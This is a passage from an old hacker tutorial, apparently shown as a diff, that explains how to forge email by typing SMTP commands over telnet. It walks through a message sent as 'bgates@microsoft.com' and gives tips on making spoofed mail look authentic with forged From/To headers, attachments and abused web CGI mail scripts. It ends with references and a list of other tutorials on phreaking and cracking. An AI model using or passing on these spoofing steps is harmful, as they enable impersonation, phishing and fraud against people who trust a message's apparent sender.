+(you will be telneting to your own box, but using root@microsoft.com)
+
+
+helo - <ENTER>
+mail from:bgates@microsoft.com <ENTER>
+rcpt to:rasinhead@www.com <ENTER>
+data <ENTER>
+Subject:Fun
+YOUR_MESSAGE
+. <ENTER>
+quit <ENTER>
+
+
+Its all done!! Send mail to yourself to test it look at the headers
+it will apear that the mail was sent from root@microsoft.com
+the third recieved field is what your are concerned about,although
+your real ip number will show up in the first field, but the person 
+getting the mailwill think this is the servers port 25 used to send 
+the mail Just a quick note another way to send fake email is to look for 
+cgi scripts on web pages that will let you cut and paste config the 
+code a little than use from your box.
+
+Appendix G: Attachments
+=======================
+To attach files to your message, you first have to UUEncode them.
+UUEncode is an encoding type that encodes your files so they won't be damaged in case they go through different routers with different platforms and operating systems, which might cause your data to corrupt. It is later UUDecoded by the recipient's mail client.
+Note that UUEncoding makes a file about 25% larger.
+Unix users can use the command uuencode. Windows users can download WinZip from www.winzip.com and use it to UUEncode their files.
+Then, simply code and paste the UUEncoded file into the telnet application after you've passed the data command and wrote your subject and your mail.
+
+Appendix H: From and To
+=======================
+When you receive an Email, it usually tells you who sent it. I don't mean the Email address, I'm talking about the identity that the sender has taken upon himself when he filled in his preferences dialog boxes for his Email client.
+You also see a "to" field, which gets filled in if the sender has you in his address book.
+You can add these two fields to make your mails look more authentic. It's easy.
+After sending the data command, you can type in this:
+From: R a v e N
+To: You
+Yes, just like 'Subject: your subject'! And it will make your fake mails look much more authentic.
+
+
+References
+==========
+RFC 821 - the SMTP RFC. Can be found at http://freesoft.org/CIE/RFC/821/index.htm. Thanks for Chris Karwoski for this one. ;-)
+
+
+Bibliography
+============
+1) Sam Spade's library - http://www.samspade.org.
+2) Various online magazines.
+3) BugTraq's archives - http://www.securityfocus.com/level2/bottom.html?go=search
+4) Packet Storm Security - http://packetstorm.securify.com
+5) Security Focus - http://www.securityfocus.com
+6) Rootshell - http://www.rootshell.com
+7) Hackersclub - http://www.hackersclub.com
+
+
+Other Tutorials by Black Sun
+============================
+* FTP Hacking.
+* Overclocking.
+* Ad and Spam Blocking.
+* Sendmail.
+* Phreaking.
+* Advanced Phreaking.
+* Phreaking II.
+* IRC Warfare.
+* Windows Registry.
+* Info Gathering.
+* Proxy/Wingate/SOCKS.
+* Offline Windows Security.
+* ICQ Security.
+* Hardware
+* Cracking, Part I.
